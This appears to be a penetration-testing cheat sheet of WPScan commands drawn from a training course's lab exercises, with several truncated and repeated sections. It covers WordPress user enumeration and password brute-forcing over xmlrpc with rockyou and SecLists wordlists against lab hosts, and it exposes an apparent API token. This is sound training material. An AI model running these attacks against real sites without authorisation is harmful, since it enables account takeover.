# Wpscan

% wpscan, wordpress, web, cpts

## Wpscan - Wpscan - Wpscan - Wpscan - login-bruteforce
#cat/ATTACK #cpts
WPScan can be used to brute force usernames and passwords. The scan report in the previous section returned two users registered on the website (admin and john). The tool uses two kinds of login brute force attacks, [xml

```
sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
```

## Wpscan - Wpscan - Wpscan - Wpscan - login-bruteforce-2
#cat/ATTACK #cpts
```
wpscan --url "http://<target>:65000/wordpress/" --api-token "BXgLvBJ90xMUR44skZCBfXvwkjIaDqJVViClXaH1lFg" -U usernames.txt -P cewler.txt
```

## Wpscan - Wpscan - Wpscan - Wpscan - wpscan
#cat/ATTACK #cpts
[WPScan](https://github.com/wpscanteam/wpscan) is an automated WordPress scanner and enumeration tool. It determines if the various themes and plugins used by a blog are outdated or vulnerable. It’s installed by default

```
sudo gem install wpscan
```

## Wpscan - Wpscan - Wpscan - Wpscan - wpscan-2
#cat/ATTACK #cpts
WPScan is also able to pull in vulnerability information from external sources. We can obtain an API token from [WPVulnDB](https://wpvulndb.com/), which is used by WPScan to scan for PoC and reports. The free plan allows

```
wpscan -h
```

## Wpscan - Wpscan - Wpscan - Wpscan - wpscan-3
#cat/ATTACK #cpts
WPScan is also able to pull in vulnerability information from external sources. We can obtain an API token from [WPVulnDB](https://wpvulndb.com/), which is used by WPScan to scan for PoC and reports. The free plan allows

```
o, --output FILE Output to FILE
```

## Wpscan - Wpscan - Wpscan - Wpscan - wpscan-4
#cat/ATTACK #cpts
The `--enumerate` flag is used to enumerate various components of the WordPress application, such as plugins, themes, and users. By default, WPScan enumerates vulnerable plugins, themes, users, media, and backups. Howeve

```
sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token dEOFB
```

## Wpscan - Wpscan - Wpscan - Wpscan - enumerate-the-host-and-find-a-flagtxt-flag-in-an-accessible-directory
#cat/ATTACK #cpts
After spawning the target machine, students need to make sure that the following `VHost` entry is present in `/etc/hosts`: - `STMIP blog.inlanefreight.local` Subsequently, students need to enumerate the spawned target ma

```
wpscan --url http://blog.inlanefreight.local --enumerate
```

## Wpscan - Wpscan - Wpscan - Wpscan - enumerate-the-host-and-find-a-flagtxt-flag-in-an-accessible-directory-2
#cat/ATTACK #cpts
```
└──╼ [★]$ sudo wpscan --url http://blog.inlanefreight.local --enumerate
```

## Wpscan - Wpscan - Wpscan - Wpscan - perform-user-enumeration-against-bloginlanefrieghtlocal-aside-from-adm
#cat/ATTACK #cpts
```
└──╼ [★]$ wpscan --url http://blog.inlanefreight.local --enumerate
```

## Wpscan - Wpscan - Wpscan - Wpscan - perform-a-login-bruteforcing-attack-against-the-discovered-user-submit
#cat/ATTACK #cpts
As per the previous question, students know that the other user is `doug`. Thus, they need to bruteforce this user's password with `WPScan`:

```
wpscan --password-attack xmlrpc -t 20 -U doug -P /usr/share/wordlists/rockyou.txt --url blog.inlanefreight.local
```

## Wpscan - Wpscan - Wpscan - Wpscan - perform-a-login-bruteforcing-attack-against-the-discovered-user-submit-2
#cat/ATTACK #cpts
```
└──╼ [★]$ wpscan --password-attack xmlrpc -t 20 -U doug -P /usr/share/wordlists/rockyou.txt --url blog.inlanefreight.local
```

## Wpscan - Wpscan - Wpscan - Wpscan - exploit-the-wordpress-instance-and-find-a-flag-in-the-web-root-submit-
#cat/ATTACK #cpts
Subsequently, students need to perform an enumeration scan to check for available users using `Wpscan` on the `WordPress` instance, finding `ilfreightwp`, `john`, `tom`, and `james`:

```
wpscan --url http://ir.inlanefreight.local -e u -t 500 --no-banner
```

## Wpscan - Wpscan - Wpscan - Wpscan - exploit-the-wordpress-instance-and-find-a-flag-in-the-web-root-submit--2
#cat/ATTACK #cpts
```
└──╼ [★]$ wpscan --url http://ir.inlanefreight.local -e u -t 500 --no-banner
```

## Wpscan - Wpscan - Wpscan - Wpscan - exploit-the-wordpress-instance-and-find-a-flag-in-the-web-root-submit--3
#cat/ATTACK #cpts
Afterward, students need to perform a password bruteforce attack against the user `ilfreightwp` using `Wpscan` (or any other tool, such as `Hydra`), specifying the SecLists wordlist `darkweb2017-top100.txt` to be used; `

```
wpscan --url http://ir.inlanefreight.local -P /usr/share/SecLists/Passwords/darkweb2017-top100.txt -U ilfreightwp --no-banner -t 500
```

## Wpscan - Wpscan - Wpscan - Wpscan - exploit-the-wordpress-instance-and-find-a-flag-in-the-web-root-submit--4
#cat/ATTACK #cpts
```
└──╼ [★]$ wpscan --url http://ir.inlanefreight.local -P /usr/share/SecLists/Passwords/darkweb2017-top100.txt -U ilfreightwp --no-banner -t 500
```

